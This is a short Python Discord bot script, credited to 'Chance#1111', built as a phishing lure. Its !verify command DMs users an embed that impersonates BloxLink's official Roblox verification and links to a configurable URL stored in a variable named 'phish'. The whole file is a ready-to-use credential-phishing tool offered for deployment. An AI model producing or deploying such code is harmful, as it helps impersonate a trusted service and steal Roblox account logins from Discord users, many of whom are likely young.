'''
Creds to Chance#1111 for coding this. 
Removing these credits will result in a copyright claim


'''

import discord
from discord.ext import commands
import requests

################### change these to your liking ###################

token = "BOT TOKEN HERE"
prefix = "!"
title = "Please Complete Verification"
desc ="To verify your account, please join BloxLink\'s Official Roblox Verification Game"
field = "🔽 Please Login and join the game 🔽"
hyperlink = ""
phish = ""





client = commands.Bot(command_prefix = prefix)
client.remove_command('help')

@client.event
async def on_ready():
    print('')
    print('----------------')
    print('Selfbot Online!')
    print('----------------')

main = discord.Embed(title=title,description=desc,color=0xcf4948)
main.add_field(name=field,value=f"[{hyperlink}]({phish})")
main.set_thumbnail(url='https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png')

@client.command()
async def verify(ctx):
    await ctx.send('***Sent Verification Link! Please Check DMs***')
    await ctx.author.send(embed=main)





client.run(token)
